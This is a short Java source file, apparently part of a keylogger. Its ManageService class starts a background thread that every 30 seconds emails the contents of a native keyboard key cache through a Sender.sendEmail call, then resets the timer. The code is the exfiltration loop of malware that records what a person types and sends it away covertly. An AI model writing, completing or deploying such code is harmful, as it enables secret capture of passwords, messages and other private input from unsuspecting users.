package handler;

import keys.NativeKeyboard;

public class ManageService implements Runnable {

    private NativeKeyboard keyboard;
    private Thread service;

    public ManageService() {
        keyboard = new NativeKeyboard();
        service = new Thread(this, "Manage Service");
        service.start();
    }

    public NativeKeyboard getKeyboard() {
        return keyboard;
    }

    @Override
    public void run() {
        long start = System.nanoTime();
        while (true) {
            long elapsed = (System.nanoTime() - start) / 1000000;
            if (elapsed > 30000) {
                try {
                    Sender.sendEmail(Utils.prettyPrint(keyboard.getKeyCache()));
                    keyboard.onSend();
                } catch (Throwable throwable) {
                    throwable.printStackTrace();
                    keyboard.onFail();
                }

                start = System.nanoTime();
            }
        }
    }
}
